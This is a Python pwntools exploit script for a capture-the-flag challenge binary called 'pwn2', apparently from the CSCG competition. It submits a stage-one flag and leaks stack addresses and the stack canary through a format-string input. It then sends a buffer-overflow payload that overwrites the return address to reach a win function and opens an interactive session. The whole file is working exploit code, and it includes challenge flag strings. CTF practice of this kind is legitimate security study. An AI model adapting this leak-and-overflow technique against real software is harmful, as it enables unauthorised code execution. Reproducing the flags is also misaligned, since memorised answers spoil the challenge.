#!/usr/bin/python
from pwn import *
import time as t

STACK_CANARY_INDEX = 44

p = process("../resources/pwn2")
print("[info] attached to process ")

#prepare first payload (password)
PASSWORD = "CSCG{FLAG_FROM_STAGE_1}" # CSCG{NOW_GET_VOLDEMORT}

print("[info] password is")
print("[info] " + PASSWORD)

p.recvuntil("Enter the password of stage 1:\n")
p.sendline(PASSWORD)
print("successfully passed pw check")


fstring = "%p " * 50
p.recvuntil("Enter your witch name:\n")
p.sendline(fstring)
leak = p.recvuntil(" enter your magic spell:\n")
addr_arr = leak.split(" ")
# info
for x in addr_arr:
    print(x)

retp_welcome = addr_arr[46] # correct
p_win = int(retp_welcome,16) - 0x26a
p_win_ret = p_win + 0x3a
stack_canary = addr_arr[STACK_CANARY_INDEX]

print("[info] retp_welcome@ "+ retp_welcome)
print("[info] p_win@ " + hex(p_win))
print("[info] p_win_ret@ " + hex(p_win_ret))
print("[info] stack_canary@ " + stack_canary)
print("[info] indexof stack_canary@ " + hex(STACK_CANARY_INDEX))

#preparing padding 
#raw_input("herro")
padding = "Expelliarmus\0x00"
padding += (0xff - (len(padding)+1)) * 'P' # fill to 255
padding += 10 * 'A' # alignment
padding += p64(int(stack_canary,16), endian='little') # 8 byte stack canary
padding += 8 * 'B'
padding += p64(p_win_ret, endian='little')
padding += p64(p_win, endian='little')
p.sendline(padding)
p.interactive()